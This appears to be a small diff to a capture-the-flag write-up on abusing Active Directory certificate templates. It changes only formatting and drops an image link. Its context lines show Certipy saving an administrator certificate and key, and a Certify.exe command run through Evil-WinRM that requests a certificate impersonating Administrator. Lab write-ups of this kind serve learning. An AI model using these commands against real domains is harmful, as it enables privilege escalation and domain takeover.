@@ -69,7 +69,7 @@ Certipy v4.8.2 - by Oliver Lyak (ly4k)
     DNS Host Name: '10.10.xx.xx'
 [*] Certificate has no object SID
 [*] Saved certificate and private key to 'administrator_10.pfx'
------------------------------------------------------------------------------------------
+-----------------------------------------------------------------------------------
 ## or using Certify.exe on the target machine
 *Evil-WinRM* PS C:\temp> ./Certify.exe request /ca:DC01.sequel.htb\sequel-DC01-CA /template:DunderMifflinAuthentication /altname:Administrator
 
@@ -198,5 +198,3 @@ Certipy v4.7.0 - by Oliver Lyak (ly4k)
 
 
 ```
-
-![](../Pasted%20image%2020250116170016.png)
